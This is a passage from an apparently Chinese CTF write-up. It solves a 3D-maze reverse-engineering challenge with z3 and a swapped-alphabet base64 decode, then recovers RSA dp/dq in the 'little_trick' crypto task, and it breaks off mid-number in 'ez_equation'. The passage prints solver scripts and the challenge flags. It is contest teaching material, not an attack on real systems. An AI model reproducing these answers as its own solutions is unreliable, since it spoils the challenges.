&#125;</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">S   下一层  </span></span><br><span class="line"><span class="string">W   上一层    </span></span><br><span class="line"><span class="string">a   左移动1</span></span><br><span class="line"><span class="string">d   右边移动2 </span></span><br><span class="line"><span class="string">s   向上一行</span></span><br><span class="line"><span class="string">w   向下两行</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>打印出地图，三维迷宫路径上只能为O或E，从S出发最终到E，走22步到达，路径规模比较小，直接手过迷宫即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">S # O # # # # # # O # # # # # </span><br><span class="line"># # # O # # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # O # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # O # # O # # # # # # </span><br><span class="line"># # # # O # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # O # # # </span><br><span class="line"># # # # # # # # # # # # # # #      </span><br><span class="line"></span><br><span class="line"># # O # # # O # # # # # O # # </span><br><span class="line"># # # # # # # # # # # # O # # </span><br><span class="line"># # # O # # # O # # # # # # # </span><br><span class="line"># # # # # # O # # # # # # # # </span><br><span class="line"># # # # # # O # O O # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # O # # # # # # # # # </span><br><span class="line"># # # # # # O # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"></span><br><span class="line"># # O # # # # # # O # # # # # </span><br><span class="line"># # # # # # # # # # O # # # # </span><br><span class="line"># # O # # # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # O O # </span><br><span class="line"># # O # O # O O O # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # O </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # O # # # # # O # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"></span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # O # # # # # # # # # # </span><br><span class="line"># # # O # # # # # # # # # # # </span><br><span class="line"># # O # # # # # # # # # # # # </span><br><span class="line"># # O # # # # # O # # # # # # </span><br><span class="line"># # # # # # # # # O O # # # # </span><br><span class="line"># # # # # # # # # # # O # # # </span><br><span class="line"># # # # O # # # # E # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"></span><br><span class="line"># # O # # # # # # # # # # # O </span><br><span class="line"># # O # # # # # # # # # # # # </span><br><span class="line"># # # # # # # # # # # # # # # </span><br><span class="line"># # # # # # # # O O # # # # # </span><br><span class="line"># # # # # # O O O # # # # # # </span><br><span class="line"># # # # # # # # # # O # # # # </span><br><span class="line"># # # # # # O # # # O # # # # </span><br><span class="line"># # # # # # # # # # O # # # # </span><br><span class="line"># # # # # # O # O # O # O # # </span><br><span class="line"># # # O # # # # # # # # # # # </span><br><span class="line"><span class="comment">//dWWwwdddWWaawwddsssSaw</span></span><br></pre></td></tr></table></figure>

<p>调试程序下载msvcr100d.dll最新版放在同目录下，下断点到有congratulation处。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = sub_3D13ED(&amp;a1);                       <span class="comment">// v1是长度</span></span><br><span class="line">    v2 = sub_3D1262(&amp;a1, i % v1);</span><br><span class="line">    sub_3D14AB(byte_3E024C[i] ^ *v2);           <span class="comment">// v2是输入的迷宫路径</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//byte_3E024C全为0，交叉引用发现另一处变化。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __stdcall <span class="title">sub_3D1D80</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">44</span>; ++i )</span><br><span class="line">    byte_3E0000[i] = byte_3E024B[i] &amp; <span class="number">0xE0</span> | byte_3E024C[i] &amp; <span class="number">0x1F</span>;</span><br><span class="line">  byte_3E0000[<span class="number">0</span>] = byte_3E0277 &amp; <span class="number">0xE0</span> | byte_3E024C[<span class="number">0</span>] &amp; <span class="number">0x1F</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//已知byte_3E0000，反求右侧，这里直接用z3求解</span></span><br></pre></td></tr></table></figure>

<p>如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">kk=[BitVec(<span class="string">&#x27;a%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>)]</span><br><span class="line">enc=[<span class="number">0x0E</span>, <span class="number">0x5D</span>, <span class="number">0x7D</span>, <span class="number">0x7D</span>, <span class="number">0x5D</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x5D</span>, <span class="number">0x7D</span>, <span class="number">0x6B</span>, <span class="number">0x4B</span>, <span class="number">0x5D</span>, <span class="number">0x5D</span>, <span class="number">0x4E</span>, <span class="number">0x4E</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0x59</span>, <span class="number">0x6B</span>, <span class="number">0x5D</span>, <span class="number">0x53</span>, <span class="number">0x24</span>, <span class="number">0x7B</span>, <span class="number">0x34</span>, <span class="number">0x07</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0x1B</span>, <span class="number">0x23</span>, <span class="number">0x27</span>, <span class="number">0x7E</span>, <span class="number">0x35</span>, <span class="number">0x3F</span>, <span class="number">0x12</span>, <span class="number">0x1B</span>, <span class="number">0x29</span>, <span class="number">0x32</span>, <span class="number">0x09</span>, <span class="number">0x16</span>, <span class="number">0x12</span>, <span class="number">0x60</span>, <span class="number">0x4A</span>]</span><br><span class="line">tmp=[<span class="number">0</span>]*<span class="number">44</span></span><br><span class="line">s=Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">44</span>):</span><br><span class="line">   tmp[i]=(kk[i-<span class="number">1</span>]&amp;<span class="number">0xe0</span>)| (kk[i]&amp;<span class="number">0x1f</span>)</span><br><span class="line">   s.add(tmp[i]==enc[i])</span><br><span class="line">tmp[<span class="number">0</span>]=kk[<span class="number">0</span>]&amp;<span class="number">0x1f</span></span><br><span class="line">s.add(tmp[<span class="number">0</span>]==enc[<span class="number">0</span>])</span><br><span class="line">s.check()</span><br><span class="line">m=s.model()</span><br><span class="line">key=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>):</span><br><span class="line">   key.append(m[kk[i]].as_long())</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i])^key[i+<span class="number">22</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#W3lc0me_t0_The_Maze!!&#125;</span></span><br></pre></td></tr></table></figure>

<p>这样拿到flag后半段是对的，前半段根据hint在strings窗口查看，发现一串base64，直接解码是乱码，对base64表交叉引用发现表经过了变化，即base64换表，写脚本还原即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    for ( j = 0; j &lt; 63; j += 2 )</span></span><br><span class="line"><span class="string">      sub_3D121C(&amp;byte_3E0030[j], &amp;basetable[j]);// 交换函数</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br><span class="line"> <span class="keyword">import</span> base64</span><br><span class="line">base=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">new=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">63</span>,<span class="number">2</span>):</span><br><span class="line">    new+=base[i+<span class="number">1</span>]+base[i]</span><br><span class="line">enc=<span class="string">&#x27;QCAmN2sYNGUfR3EvOUMuNWYkW3k1JR==&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">if</span> enc[i] <span class="keyword">in</span> new:</span><br><span class="line">        c+=base[new.index(enc[i])]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c+=<span class="string">&#x27;=&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(c))  </span><br><span class="line"><span class="comment">#D0g3&#123;Y0u^Can=So1ve_it!</span></span><br><span class="line"><span class="comment">#flag：D0g3&#123;Y0u^Can=So1ve_it!W3lc0me_t0_The_Maze!!&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><p> 签到题，给了p,q,c但是没给e,分别按位加密了dp,dq,只需要挨个还原即可，需要注意的是加密dq那儿是py2,需要用py2跑随机数，还原dp,dq再已知dp,dq,p,q解密。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">119494148343917708105807117614773529196380452025859574123211538859983094108015678321724495609785332508563534950957367289723559468197440246960403054020452985281797756117166991826626612422135797192886041925043855329391156291955066822268279533978514896151007690729926904044407542983781817530576308669792533266431</span></span><br><span class="line"></span><br><span class="line">q=<span class="number">125132685086281666800573404868585424815247082213724647473226016452471461555742194042617318063670311290694310562746442372293133509175379170933514423842462487594186286854028887049828613566072663640036114898823281310177406827049478153958964127866484011400391821374773362883518683538899757137598483532099590137741</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">10238271315477488225331712641083290024488811710093033734535910573493409567056934528110845049143193836706122210303055466145819256893293429223389828252657426030118534127684265261192503406287408932832340938343447997791634435068366383965928991637536875223511277583685579314781547648602666391656306703321971680803977982711407979248979910513665732355859523500729534069909408292024381225192240385351325999798206366949106362537376452662264512012770586451783712626665065161704126536742755054830427864982782030834837388544811172279496657776884209756069056812750476669508640817369423238496930357725842768918791347095504283368032</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dq=<span class="number">23458591381644494879596426183878928641891759871602961070839457303969747353773411708437315165237216481430908369709167907047043280248152040749469402814146054871536032870746473649690743697560576735624528397398691515920649222501258921802372365480019200479555430922883680472732415240714991623845227274793947921407</span></span><br><span class="line">dp=<span class="number">104137587579880166582178434901328539485184135240660490271571544307637817287517428663992284342411864826922600858353966205614398977234519495034539643954586905495941906386407181383904043194285771983919780892934288899562700746832428876894943676937141813284454381136254907871626581989544814547778881240129496262777</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">p,q,dq,dp,c</span>):</span></span><br><span class="line">    n = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    dd = gmpy2.gcd(p-<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    d=(dp-dq)//dd * gmpy2.invert((q-<span class="number">1</span>)//dd, (p-<span class="number">1</span>)//dd) * (q-<span class="number">1</span>) +dq</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">decrypt(p,q,dp,dq,c)</span><br><span class="line"><span class="comment">#D0g3&#123;Welc0me_t0_iSOON_4nd_have_4_go0d_time&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">result=[1, 0, 7789, 1, 17598, 20447, 15475, 23040, 41318, 23644, 53369, 19347, 66418, 5457, 0, 1, 14865, 97631, 6459, 36284, 79023, 1, 157348, 44667, 185701, 116445, 23809, 220877, 0, 1, 222082, 30333, 55446, 207442, 193806, 149389, 173229, 349031, 152205, 1, 149157, 196626, 1, 222532, 10255, 46268, 171536, 0, 351788, 152678, 0, 172225, 109296, 0, 579280, 634746, 1, 668942, 157973, 1, 17884, 662728, 759841, 450490, 0, 139520, 157015, 616114, 199878, 154091, 1, 937462, 675736, 53200, 495985, 307528, 1, 804492, 790322, 463560, 520991, 436782, 762888, 267227, 306436, 1051437, 384380, 505106, 729384, 1261978, 668266, 1258657, 913103, 935600, 1, 1, 401793, 769612, 484861, 1024896, 517254, 638872, 1139995, 700201, 308216, 333502, 0, 0, 401082, 1514640, 667345, 1015119, 636720, 1011683, 795560, 783924, 1269039, 5333, 0, 368271, 1700344, 1, 383167, 7540, 1490472, 1484752, 918665, 312560, 688665, 967404, 922857, 624126, 889856, 1, 848912, 1426397, 1291770, 1669069, 0, 1709762, 130116, 1711413, 1336912, 2080992, 820169, 903313, 515984, 2211283, 684372, 2773063, 391284, 1934269, 107761, 885543, 0, 2551314, 2229565, 1392777, 616280, 1368347, 154512, 1, 1668051, 0, 2453671, 2240909, 2661062, 2880183, 1376799, 0, 2252003, 1, 17666, 1, 2563626, 251045, 1593956, 2215158, 0, 93160, 0, 2463412, 654734, 1, 3341062, 3704395, 3841103, 609968, 2297131, 1942751, 3671207, 1, 1209611, 3163864, 3054774, 1055188, 1, 4284662, 3647599, 247779, 0, 176021, 3478840, 783050, 4613736, 2422927, 280158, 2473573, 2218037, 936624, 2118304, 353989, 3466709, 4737392, 2637048, 4570953, 1473551, 0, 0, 4780148, 3299784, 592717, 538363, 2068893, 814922, 2183138, 2011758, 2296545, 5075424, 1814196, 974225, 669506, 2756080, 5729359, 4599677, 5737886, 3947814, 4852062, 1571349, 4123825, 2319244, 4260764, 1266852, 1, 3739921, 1, 5948390, 1, 2761119, 2203699, 1664472, 3182598, 6269365, 5344900, 454610, 495499, 6407607, 1, 1, 476694, 4339987, 5642199, 1131185, 4092110, 2802555, 0, 5323448, 1103156, 2954018, 1, 1860057, 128891, 2586833, 6636077, 3136169, 1, 3280730, 6970001, 1874791, 48335, 6229468, 6384918, 5412112, 1, 7231540, 7886316, 2501899, 8047283, 2971582, 354078, 401999, 6427168, 4839680, 1, 44050, 3319427, 0, 1, 1452967, 4620879, 5525420, 5295860, 643415, 5594621, 951449, 1996797, 2561796, 6707895, 7072739]</span></span><br><span class="line"><span class="string">ll=len(result)</span></span><br><span class="line"><span class="string">list_p = sieve_base[0:ll]</span></span><br><span class="line"><span class="string">list_q = sieve_base[ll:2*ll]</span></span><br><span class="line"><span class="string">dq=&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(ll):</span></span><br><span class="line"><span class="string">    p=list_p[i]</span></span><br><span class="line"><span class="string">    q=list_q[i]</span></span><br><span class="line"><span class="string">    f=False</span></span><br><span class="line"><span class="string">    for j in range(10):</span></span><br><span class="line"><span class="string">        if pow(j,65537,p*q)==result[i]:</span></span><br><span class="line"><span class="string">            dq+=str(j)</span></span><br><span class="line"><span class="string">            f=True</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    if not f:</span></span><br><span class="line"><span class="string">        print(&#x27;error&#x27;)</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">print(dq)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#py2</span></span><br><span class="line"><span class="string">import random</span></span><br><span class="line"><span class="string">seeds=[3, 0, 39, 78, 14, 49, 73, 83, 55, 48, 30, 28, 23, 16, 54, 23, 68, 7, 20, 8, 98, 68, 45, 36, 97, 13, 83, 68, 16, 59, 81, 26, 51, 45, 36, 60, 36, 94, 58, 11, 19, 33, 95, 12, 60, 38, 51, 95, 21, 3, 38, 72, 47, 80, 7, 20, 26, 80, 18, 43, 92, 4, 64, 93, 91, 12, 86, 63, 46, 73, 89, 5, 91, 17, 88, 94, 80, 42, 90, 14, 45, 53, 91, 16, 28, 81, 62, 63, 66, 20, 81, 3, 43, 99, 54, 22, 2, 27, 2, 62, 88, 99, 78, 25, 76, 49, 28, 96, 95, 57, 94, 53, 32, 58, 32, 72, 89, 15, 4, 78, 89, 74, 86, 45, 51, 65, 13, 75, 95, 42, 20, 77, 34, 66, 56, 20, 26, 18, 28, 11, 88, 62, 72, 27, 74, 42, 63, 76, 82, 97, 75, 92, 1, 5, 20, 78, 46, 85, 81, 54, 64, 87, 37, 91, 38, 39, 1, 90, 61, 28, 13, 60, 37, 90, 87, 15, 78, 91, 99, 58, 62, 73, 70, 56, 82, 5, 19, 54, 76, 88, 4, 3, 55, 3, 3, 22, 85, 67, 98, 28, 32, 42, 48, 96, 69, 3, 83, 48, 26, 20, 45, 16, 45, 47, 92, 0, 54, 4, 73, 8, 31, 38, 3, 10, 84, 60, 59, 69, 64, 91, 98, 73, 81, 98, 9, 70, 44, 44, 24, 95, 83, 49, 31, 19, 89, 18, 20, 78, 86, 95, 83, 23, 42, 51, 95, 80, 48, 46, 88, 7, 47, 64, 55, 4, 62, 37, 71, 75, 98, 67, 98, 58, 66, 70, 24, 58, 56, 44, 11, 78, 1, 78, 89, 97, 83, 72, 98, 12, 41, 33, 14, 40, 27, 5, 18, 35, 25, 31, 69, 97, 84, 47, 25, 90, 78, 15, 72, 71]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rand=&#x27;[54, 36, 60] [84, 42, 25] [20, 38, 39] [81, 9, 92] [70, 65, 94] [6, 11, 75] [27, 50, 46] [49, 85, 8] [95, 14, 73] [54, 71, 30] [53, 28, 65] [11, 13, 59] [94, 89, 8] [36, 41, 44] [91, 13, 48] [92, 94, 89] [94, 74, 90] [32, 65, 7] [90, 68, 90] [22, 96, 12] [83, 35, 5] [74, 74, 90] [27, 48, 33] [32, 98, 95] [80, 37, 84] [25, 68, 84] [49, 85, 37] [74, 94, 74] [48, 41, 44] [22, 94, 2] [50, 45, 38] [74, 20, 20] [50, 16, 82] [27, 8, 33] [32, 98, 91] [30, 57, 26] [98, 95, 91] [54, 28, 43] [58, 20, 94] [45, 55, 92] [78, 52, 51] [57, 81, 27] [76, 51, 53] [47, 65, 66] [57, 26, 80] [63, 72, 6] [24, 50, 82] [76, 51, 99] [68, 63, 47] [23, 36, 60] [63, 42, 6] [7, 59, 98] [43, 45, 34] [27, 70, 95] [32, 15, 7] [90, 68, 76] [20, 20, 60] [27, 70, 95] [18, 66, 19] [3, 69, 14] [56, 55, 58] [23, 39, 15] [47, 63, 92] [91, 49, 56] [17, 68, 16] [47, 66, 14] [79, 3, 31] [44, 29, 90] [39, 58, 85] [27, 56, 46] [8, 60, 14] [62, 74, 79] [17, 68, 16] [52, 96, 28] [39, 18, 62] [54, 12, 28] [54, 70, 95] [63, 27, 22] [20, 9, 58] [10, 70, 65] [48, 8, 33] [61, 45, 71] [8, 17, 16] [36, 48, 41] [13, 59, 17] [50, 55, 38] [92, 17, 23] [44, 29, 90] [43, 24, 44] [90, 76, 90] [50, 45, 38] [23, 54, 36] [69, 14, 46] [40, 17, 24] [91, 13, 48] [95, 14, 2] [94, 5, 8] [64, 95, 19] [95, 94, 8] [92, 17, 97] [18, 90, 62] [40, 17, 24] [81, 9, 73] [37, 92, 84] [95, 20, 29] [6, 11, 75] [11, 13, 17] [37, 90, 39] [51, 99, 53] [4, 1, 51] [54, 12, 43] [61, 89, 45] [21, 30, 90] [58, 64, 94] [7, 21, 90] [7, 59, 98] [60, 99, 14] [96, 73, 15] [23, 10, 15] [81, 9, 92] [60, 99, 14] [85, 11, 12] [79, 3, 31] [27, 48, 8] [50, 16, 82] [41, 84, 44] [25, 68, 84] [45, 43, 4] [51, 99, 53] [63, 27, 22] [90, 68, 90] [79, 32, 24] [58, 84, 89] [7, 24, 44] [96, 55, 52] [90, 68, 76] [20, 20, 60] [18, 33, 19] [11, 13, 17] [45, 55, 92] [18, 90, 62] [92, 97, 23] [7, 59, 34] [64, 70, 95] [51, 11, 12] [63, 27, 22] [44, 29, 48] [37, 95, 20] [48, 50, 96] [19, 37, 84] [45, 43, 76] [42, 56, 55] [84, 76, 25] [62, 79, 94] [90, 68, 90] [81, 9, 92] [39, 58, 85] [19, 10, 90] [50, 45, 38] [91, 13, 55] [63, 40, 92] [14, 83, 54] [68, 9, 84] [8, 17, 68] [42, 72, 6] [20, 19, 39] [13, 84, 25] [20, 9, 65] [55, 80, 32] [11, 59, 17] [25, 68, 84] [30, 57, 26] [9, 61, 84] [20, 65, 58] [14, 18, 54] [96, 1, 73] [9, 92, 73] [8, 68, 16] [40, 20, 24] [58, 20, 64] [17, 97, 23] [27, 56, 46] [90, 29, 13] [96, 55, 47] [48, 50, 96] [62, 79, 94] [67, 78, 51] [91, 13, 55] [95, 20, 29] [39, 90, 62] [23, 10, 15] [23, 54, 36] [95, 14, 73] [23, 36, 60] [23, 54, 60] [95, 14, 2] [61, 10, 90] [7, 97, 41] [35, 83, 5] [11, 13, 59] [21, 30, 90] [63, 27, 22] [54, 13, 30] [37, 90, 39] [9, 16, 60] [23, 36, 60] [49, 85, 37] [54, 13, 71] [20, 20, 60] [90, 76, 90] [27, 48, 33] [36, 48, 41] [48, 8, 33] [35, 45, 34] [42, 56, 58] [84, 75, 42] [13, 55, 48] [23, 39, 15] [27, 50, 46] [22, 96, 12] [11, 39, 68] [63, 72, 6] [23, 54, 60] [57, 42, 57] [91, 3, 0] [30, 26, 80] [22, 93, 2] [68, 9, 16] [63, 40, 92] [8, 68, 16] [35, 83, 5] [27, 50, 56] [45, 55, 38] [35, 35, 5] [46, 37, 86] [90, 29, 45] [54, 86, 17] [40, 86, 17] [71, 83, 99] [76, 51, 99] [85, 8, 37] [6, 11, 75] [1, 11, 68] [67, 78, 52] [60, 99, 14] [18, 33, 19] [90, 68, 90] [81, 9, 92] [3, 83, 31] [76, 99, 53] [49, 85, 37] [92, 94, 89] [2, 27, 22] [24, 16, 82] [76, 51, 53] [27, 54, 70] [13, 71, 30] [88, 58, 85] [39, 18, 62] [32, 15, 65] [43, 45, 34] [47, 40, 92] [9, 95, 73] [23, 10, 39] [17, 97, 23] [68, 61, 84] [32, 62, 98] [45, 43, 4] [83, 35, 5] [7, 97, 41] [35, 83, 5] [58, 20, 64] [43, 24, 44] [90, 45, 13] [71, 83, 99] [58, 20, 64] [55, 47, 52] [40, 86, 17] [45, 55, 46] [81, 9, 92] [84, 76, 25] [81, 92, 73] [8, 60, 14] [19, 80, 37] [85, 8, 37] [7, 98, 34] [35, 83, 5] [47, 65, 66] [23, 16, 91] [57, 81, 27] [10, 70, 94] [45, 87, 3] [70, 95, 19] [62, 79, 94] [18, 66, 19] [54, 75, 74] [92, 84, 21] [1, 39, 68] [68, 9, 60] [19, 80, 37] [91, 3, 0] [35, 45, 34] [37, 92, 21] [20, 9, 65] [9, 92, 73] [96, 73, 15] [7, 59, 34] [32, 62, 0]&#x27;</span></span><br><span class="line"><span class="string">result=[-38, -121, -40, -125, -51, -29, -2, -21, -59, -54, -51, -40, -105, -5, -4, -50, -127, -56, -124, -128, -23, -104, -63, -112, -34, -115, -58, -99, -24, -102, -1, -5, -34, -3, -104, -103, -21, -62, -121, -24, -115, -9, -87, -56, -39, -30, -34, -4, -33, -5, -114, -21, -19, -7, -119, -107, -115, -6, -25, -27, -32, -62, -28, -20, -60, -121, -102, -10, -112, -7, -85, -110, -62, -100, -110, -29, -41, -55, -113, -112, -45, -106, -125, -25, -57, -27, -83, -2, -51, -118, -2, -10, -50, -40, -1, -82, -111, -113, -50, -48, -23, -33, -112, -38, -29, -26, -4, -40, -123, -4, -44, -120, -63, -38, -41, -22, -50, -50, -17, -122, -61, -5, -100, -22, -44, -47, -125, -125, -127, -55, -117, -100, -2, -26, -32, -111, -123, -118, -16, -24, -20, -40, -92, -40, -102, -49, -99, -45, -59, -98, -49, -13, -62, -128, -121, -114, -112, -13, -3, -4, -26, -35, -15, -35, -8, -18, -125, -14, -6, -60, -113, -104, -120, -64, -104, -55, -104, -41, -34, -106, -105, -2, -28, -14, -58, -128, -3, -1, -17, -38, -18, -12, -59, -4, -19, -82, -40, -122, -18, -42, -53, -60, -113, -40, -126, -15, -63, -40, -124, -114, -58, -26, -35, -26, -8, -48, -112, -52, -11, -117, -52, -32, -21, -38, -124, -13, -103, -6, -30, -33, -28, -31, -1, -97, -59, -64, -28, -1, -40, -2, -10, -26, -24, -3, -50, -113, -125, -122, -124, -5, -50, -62, -11, -8, -88, -109, -7, -31, -105, -54, -28, -8, -62, -58, -101, -58, -53, -124, -18, -124, -17, -109, -52, -45, -40, -109, -85, -7, -108, -121, -58, -49, -91, -102, -8, -10, -17, -55, -19, -11, -116, -47, -120, -121, -23, -99, -19, -51, -36, -110, -126, -29, -110, -9, -97, -54, -83, -86]</span></span><br><span class="line"><span class="string">l=len(result)</span></span><br><span class="line"><span class="string">rand=[]</span></span><br><span class="line"><span class="string">dp=&#x27;&#x27;</span></span><br><span class="line"><span class="string">for j in range(0,l):</span></span><br><span class="line"><span class="string">    random.seed(seeds[j])</span></span><br><span class="line"><span class="string">    rands=[]</span></span><br><span class="line"><span class="string">    for k in range(0,4):</span></span><br><span class="line"><span class="string">        rands.append(random.randint(0,99))</span></span><br><span class="line"><span class="string">    rand.append(rands)</span></span><br><span class="line"><span class="string">    x=rands[j%4]</span></span><br><span class="line"><span class="string">    f=False</span></span><br><span class="line"><span class="string">    for i in range(255):</span></span><br><span class="line"><span class="string">        if (~i|rands[j%4]) &amp; (i|~rands[j%4]) ==result[j]:</span></span><br><span class="line"><span class="string">            dp+=chr(i)</span></span><br><span class="line"><span class="string">            f=True</span></span><br><span class="line"><span class="string">    if not f:</span></span><br><span class="line"><span class="string">        print(&#x27;error&#x27;)</span></span><br><span class="line"><span class="string">print(dp)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="ez-equation"><a href="#ez-equation" class="headerlink" title="ez_equation"></a>ez_equation</h3><p> 给了一个方程，我们设三个未知数为a,b,c，那么M1=a*a*b+b*b*a+b*b+a*b</p>
<p>M2=b*b*(c+1)+a*b*(c+1)-2</p>
<p>首先gcd(M1,M2+2)=kb</p>
<p>那么gcd(kb,b)=b</p>
<p>先求出b,然后M1,M2两个方程两个未知数，用z3直接梭出a,c</p>
<p>最后还有两个因子是相邻的，直接扔yafu或者开方取前后两个素数</p>
<p>最后再rsa解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">M1= <span class="number">3826382835023788442651551584905620963555468828948525089808250303867245240492543151274589993810948153358311949129889992078565218014437985797623260774173862776314394305207460929010448541919151371739763413408901958357439883687812941802749556269540959238015960789123081724913563415951118911225765239358145144847672813272304000303248185912184454183649550881987218183213383170287341491817813853157303415010621029153827654424674781799037821018845093480149146846916972070471616774326658992874624717335369963316741346596692937873980736392272357429717437248731018333011776098084532729315221881922688633390593220647682367272566275381196597702434911557385351389179790132595840157110385379375472525985874178185477024824406364732573663044243615168471526446290952781887679180315888377262181547383953231277148364854782145192348432075591465309521454441382119502677245090726728912738123512316475762664749771002090738886940569852252159994522316</span></span><br><span class="line">M2= <span class="number">4046011043117694641224946060698160981194371746049558443191995592417947642909277226440465640195903524402898673255622570650810338780358645872293473212692240675287998097280715739093285167811740252792986119669348108850168574423371861266994630851360381835920384979279568937740516573412510564312439718402689547377548575653450519989914218115265842158616123026997554651983837361028152010675551489190669776458201696937427188572741833635865019931327548900804323792893273443467251902886636756173665823644958563664967475910962085867559357008073496875191391847757991101189003154422578662820049387899402383235828011830444034463049749668906583814229827321704450021715601349950406035896249429068630164092309047645766216852109121662629835574752784717997655595307873219503797996696389945782836994848995124776375146245061787647756704605043856735398002012276311781956668212776588970619658063515356931386886871554860891089498456646036630114620806</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">19445950132976386911852381666731799463510958712950274248183192405937223343228119407660772413067599252710235310402278345391806863116119010697766434743302798644091220730819441599784039955347398797545219314925103529062092963912855489464914723588833817280786158985269401131919618320866942737291915603551320163001129725430205164159721810319128999027215168063922977994735609079166656264150778896809813972275824980250733628895449444386265971986881443278517689428198251426557591256226431727934365277683559038777220498839443423272238231659356498088824520980466482528835994554892785108805290209163646408594682458644235664198690503128767557430026565606308422630014285982847395405342842694189025641950775231191537369161140012412147734635114986068452144499789367187760595537610501700993916441274609074477086105160306134590864545056872161818418667370690945602050639825453927168529154141097668382830717867158189131567590506561475774252148991615602388725559184925467487450078068863876285937273896246520621965096127440332607637290032226601266371916124456122172418136550577512664185685633131801385265781677598863031205194151992390159339